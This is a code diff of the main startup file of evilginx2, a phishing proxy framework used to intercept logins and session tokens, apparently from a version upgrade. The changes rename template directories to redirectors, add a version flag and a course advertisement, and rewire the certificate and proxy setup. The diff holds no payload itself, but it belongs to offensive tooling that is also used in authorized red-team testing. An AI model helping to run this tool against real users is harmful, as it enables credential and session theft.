@@ -2,22 +2,28 @@ package main
 
 import (
 	"flag"
-	"io/ioutil"
+	"fmt"
+	_log "log"
 	"os"
 	"os/user"
 	"path/filepath"
 	"regexp"
 
+	"github.com/caddyserver/certmagic"
 	"github.com/kgretzky/evilginx2/core"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
+	"go.uber.org/zap"
+
+	"github.com/fatih/color"
 )
 
 var phishlets_dir = flag.String("p", "", "Phishlets directory path")
-var templates_dir = flag.String("t", "", "HTML templates directory path")
+var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
 var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
+var version_flag = flag.Bool("v", false, "Show version")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -29,12 +35,32 @@ func joinPath(base_path string, rel_path string) string {
 	return ret
 }
 
+func showAd() {
+	lred := color.New(color.FgHiRed)
+	lyellow := color.New(color.FgHiYellow)
+	white := color.New(color.FgHiWhite)
+	message := fmt.Sprintf("%s: %s %s", lred.Sprint("Evilginx Mastery Course"), lyellow.Sprint("https://academy.breakdev.org/evilginx-mastery"), white.Sprint("(learn how to create phishlets)"))
+	log.Info("%s", message)
+}
+
 func main() {
+	flag.Parse()
+
+	if *version_flag == true {
+		log.Info("version: %s", core.VERSION)
+		return
+	}
+
 	exe_path, _ := os.Executable()
 	exe_dir := filepath.Dir(exe_path)
 
 	core.Banner()
-	flag.Parse()
+	showAd()
+
+	_log.SetOutput(log.NullLogger().Writer())
+	certmagic.Default.Logger = zap.NewNop()
+	certmagic.DefaultACME.Logger = zap.NewNop()
+
 	if *phishlets_dir == "" {
 		*phishlets_dir = joinPath(exe_dir, "./phishlets")
 		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
@@ -45,12 +71,12 @@ func main() {
 			}
 		}
 	}
-	if *templates_dir == "" {
-		*templates_dir = joinPath(exe_dir, "./templates")
-		if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
-			*templates_dir = "/usr/share/evilginx/templates/"
-			if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
-				*templates_dir = joinPath(exe_dir, "./templates")
+	if *redirectors_dir == "" {
+		*redirectors_dir = joinPath(exe_dir, "./redirectors")
+		if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
+			*redirectors_dir = "/usr/share/evilginx/redirectors/"
+			if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
+				*redirectors_dir = joinPath(exe_dir, "./redirectors")
 			}
 		}
 	}
@@ -58,8 +84,8 @@ func main() {
 		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
 		return
 	}
-	if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
-		os.MkdirAll(*templates_dir, os.FileMode(0700))
+	if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
+		os.MkdirAll(*redirectors_dir, os.FileMode(0700))
 	}
 
 	log.DebugEnable(*debug_log)
@@ -90,17 +116,12 @@ func main() {
 
 	crt_path := joinPath(*cfg_dir, "./crt")
 
-	if err := core.CreateDir(crt_path, 0700); err != nil {
-		log.Fatal("mkdir: %v", err)
-		return
-	}
-
 	cfg, err := core.NewConfig(*cfg_dir, "")
 	if err != nil {
 		log.Fatal("config: %v", err)
 		return
 	}
-	cfg.SetTemplatesDir(*templates_dir)
+	cfg.SetRedirectorsDir(*redirectors_dir)
 
 	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
 	if err != nil {
@@ -114,7 +135,7 @@ func main() {
 		return
 	}
 
-	files, err := ioutil.ReadDir(phishlets_path)
+	files, err := os.ReadDir(phishlets_path)
 	if err != nil {
 		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
 		return
@@ -128,29 +149,28 @@ func main() {
 			}
 			pname := rpname[1]
 			if pname != "" {
-				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), cfg)
+				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), nil, cfg)
 				if err != nil {
 					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
 					continue
 				}
-				//log.Info("loaded phishlet '%s' made by %s from '%s'", pl.Name, pl.Author, f.Name())
 				cfg.AddPhishlet(pname, pl)
 			}
 		}
 	}
+	cfg.LoadSubPhishlets()
+	cfg.CleanUp()
 
 	ns, _ := core.NewNameserver(cfg)
 	ns.Start()
-	hs, _ := core.NewHttpServer()
-	hs.Start()
 
-	crt_db, err := core.NewCertDb(crt_path, cfg, ns, hs)
+	crt_db, err := core.NewCertDb(crt_path, cfg, ns)
 	if err != nil {
 		log.Fatal("certdb: %v", err)
 		return
 	}
 
-	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, *developer_mode)
+	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
 	hp.Start()
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
